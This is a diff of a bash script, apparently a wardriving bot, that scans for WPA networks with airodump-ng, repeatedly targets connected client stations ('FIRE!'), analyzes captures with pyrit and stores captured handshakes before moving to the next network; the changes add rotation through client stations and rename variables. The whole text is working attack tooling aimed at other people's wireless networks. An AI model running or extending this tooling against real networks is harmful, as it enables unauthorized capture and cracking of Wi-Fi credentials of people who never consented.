@@ -128,6 +128,7 @@ fhunt()																	#find new active clients that havn't been handshaked yet
 			echo " [*] CHANNEL: $CHAN"
 			echo " [*] POWER: $POWER";$COLOR2 9
 			$COLOR 1;echo " [*] We need this handshake [*] ";$COLOR 9
+			DEPASS=""
 			fautocap
 	fi
 	
@@ -141,15 +142,33 @@ fautocap()
 	sleep 0.2
 	gnome-terminal --geometry=130x20+0+320 -x airodump-ng mon0 --bssid $BSSID -c $CHAN -w $HOME/tmp1&
 	DONE=""
+	CLINUM=1
 	DECNT=0
 	beep -f 1000 -l 10
 	beep -f 1600 -l 100
 	while [ $DONE -z ] 2> /dev/null
 		do
+			if [ $DEPASS = "1" ] 2> /dev/null
+				then
+					echo "$(cat $HOME/tmp1-01.csv | grep 'Station' -A 20 | grep ':' | cut -d ',' -f 1 | sort -u)" > $HOME/tmp8
+					CLICNT=$(wc -l $HOME/tmp8)
+					CLICNT=${CLICNT:0:1}
+					if [ $CLINUM -gt $CLICNT ] 2> /dev/null
+						then
+							CLINUM=1
+					fi
+					if [ $(cat $HOME/tmp8) -z ] 2> /dev/null
+						then
+							A=1
+						else
+							CLIE=$(cat $HOME/tmp8 | sed -n "$CLINUM"p)
+					fi
+					CLINUM=$((CLINUM + 1))
+			fi
 			clear
-			$COLOR 2;$COLOR2 1;echo " [>] STOP THE CAR! [<] ";$COLOR 9
-			echo " [*] TARGET ESSID: $ESSID LOADED [*] "
-			echo " [*] TARGET CLIENT: $CLIE LOADED [*]";$COLOR2 9
+			$COLOR2 1;echo " [>] STOP THE CAR! [<] "
+			$COLOR 2;echo " [*] TARGET ESSID: $ESSID LOADED [*] "
+			echo " [*] TARGET CLIENT: $CLIE LOADED [*]";$COLOR2 9;$COLOR 9
 			echo
 			sleep 0.7
 			echo " [>] FIRE! [<] "
@@ -160,6 +179,7 @@ fautocap()
 			DONE2=""
 			fanalyze
 			DECNT=$((DECNT + 1))
+			DEPASS=1
 			
 			if [ $GDONE = "1" ] 2> /dev/null
 				then
@@ -168,10 +188,10 @@ fautocap()
 					beep -f 100 -l 100
 					beep -f 50 -l 100
 					$COLOR 1; echo " [*] No handshake detected ";$COLOR 9
-					$COLOR 1; echo $ISDONE | grep spread | cut -d ',' -f 2,3,4,5;$COLOR 9
+					$COLOR 1; echo $ANALYZE | grep spread | cut -d ',' -f 2,3,4,5;$COLOR 9
 					sleep 0.2
 					DONE=""
-					if [ $DECNT -gt 2 ] 2> /dev/null
+					if [ $DECNT -gt 3 ] 2> /dev/null
 						then
 							killall airodump-ng
 							fbotstart
@@ -195,7 +215,7 @@ fautocap()
 	killall airodump-ng
 	echo "$BSSID" >> $HOME/Desktop/cap/handshakes/got
 	pyrit -r $HOME/tmp1-01.cap -o "$HOME/Desktop/cap/handshakes/$ESSID-$DATE.cap" strip | grep 'New pcap-file'
-	$COLOR 2;echo $ISDONE | grep spread | cut -d ',' -f 2,3,4,5;$COLOR 9
+	$COLOR 2;echo $ANALYZE | grep spread | cut -d ',' -f 2,3,4,5;$COLOR 9
 	rm -rf $HOME/tmp*
 	sleep 2
 	fbotstart
@@ -204,11 +224,11 @@ fautocap()
 fanalyze()																#Analyze handshakes
 {
 	GDONE=""
-	while [ $(echo $ISDONE | grep $BSSID) -z ] 2> /dev/null
+	while [ $(echo $ANALYZE | grep $BSSID) -z ] 2> /dev/null
 		do
 			sleep 0.5
-			ISDONE=$(pyrit -r $HOME/tmp1-01.cap analyze 3> /dev/null)
-			if  [ $(echo $ISDONE | grep "$ESSID") -z ] 2> /dev/null
+			ANALYZE=$(pyrit -r $HOME/tmp1-01.cap analyze 3> /dev/null)
+			if  [ $(echo $ANALYZE | grep "$ESSID") -z ] 2> /dev/null
 				then
 					A=1
 				else
@@ -218,8 +238,8 @@ fanalyze()																#Analyze handshakes
 
 	while [ $DONE2 -z ] 2> /dev/null
 		do
-			echo "$ISDONE" > $HOME/tmp4
-			if  [ $(echo $ISDONE | grep "$ESSID") -z ] 2> /dev/null
+			echo "$ANALYZE" > $HOME/tmp4
+			if  [ $(echo $ANALYZE | grep "$ESSID") -z ] 2> /dev/null
 				then
 					A=1
 				else
@@ -283,7 +303,7 @@ flistap()																#List all APs
 	$COLOR 4;echo " [*] Scanning for APs, Please wait.. ";$COLOR 9
 	sleep 10
 	killall airodump-ng
-	echo "$(cat $HOME/tmp-01.csv | grep "WPA" | cut -d ',' -f 14)" > $HOME/tmp1
+	echo "$(cat $HOME/tmp-01.csv | grep WPA | cut -d ',' -f 14)" > $HOME/tmp1
 	LNUM=0
 	while read LINE
 		do
